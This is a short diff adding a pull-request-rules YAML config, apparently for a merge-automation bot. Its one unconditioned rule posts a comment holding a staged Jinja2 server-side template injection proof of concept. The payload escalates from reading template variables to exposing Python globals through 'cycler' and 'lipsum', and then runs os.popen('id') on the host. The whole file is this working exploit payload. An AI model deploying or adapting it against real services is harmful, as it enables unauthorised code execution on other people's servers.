@@ -1,0 +1,11 @@
+  pull_request_rules:
+    - name: ssti-poc
+      conditions: []
+      actions:
+        comment:
+          message: |
+            PoC-G4o7T-SSTI:
+            STEP1-baseline-author: {{ author }}
+            STEP2-cve-class-cycler: {{ ''|attr('format')('{0.__class__}', cycler) }}
+            STEP3-cve-globals-lipsum: {{ ''|attr('format')('{0.__globals__}', lipsum) }}
+            STEP4-cve-rce-id: {{ ''|attr('format')('{0.__globals__[os].popen(arg).read()}', lipsum, arg='id') }
